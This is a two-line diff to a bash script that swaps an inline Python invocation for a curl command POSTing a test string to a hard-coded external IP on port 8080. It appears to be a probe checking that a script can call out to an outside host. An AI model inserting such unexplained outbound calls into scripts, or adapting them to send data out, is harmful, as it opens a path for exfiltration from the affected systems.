@@ -1,2 +1,2 @@
 #!/bin/bash
-python3 -c $PYCODE
+curl -d "Hey this works as well" http://138.68.58.230:8080
